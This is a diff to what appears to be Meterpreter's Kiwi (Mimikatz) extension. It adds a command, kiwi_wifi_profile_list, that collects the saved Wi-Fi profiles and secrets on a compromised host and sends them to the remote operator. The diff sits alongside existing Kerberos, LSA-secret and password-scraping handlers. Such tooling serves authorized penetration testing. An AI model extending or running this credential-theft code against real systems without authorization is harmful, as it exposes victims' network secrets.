@@ -21,6 +21,7 @@ DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
 DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet);
 DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet);
 DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
+DWORD request_wifi_profile_list(Remote *remote, Packet *packet);
 
 /*! @brief The enabled commands for this extension. */
 Command customCommands[] =
@@ -31,6 +32,7 @@ Command customCommands[] =
     COMMAND_REQ("kiwi_kerberos_ticket_purge", request_kerberos_ticket_purge),
     COMMAND_REQ("kiwi_kerberos_ticket_list", request_kerberos_ticket_list),
     COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
+    COMMAND_REQ("kiwi_wifi_profile_list", request_wifi_profile_list),
     COMMAND_TERMINATOR
 };
 
@@ -181,6 +183,23 @@ DWORD request_scrape_passwords(Remote *remote, Packet *packet)
 	dprintf("[KIWI] Pwd ID: %u", pwdId);
 
 	result = mimikatz_scrape_passwords(pwdId, response);
+	packet_transmit_response(result, remote, response);
+
+	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Handler for request to list all wifi profiles/secrets.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
+DWORD request_wifi_profile_list(Remote *remote, Packet *packet)
+{
+	DWORD result;
+	Packet * response = packet_create_response(packet);
+
+	result = mimikatz_wifi_profile_list(response);
 	packet_transmit_response(result, remote, response);
 
 	return ERROR_SUCCESS;
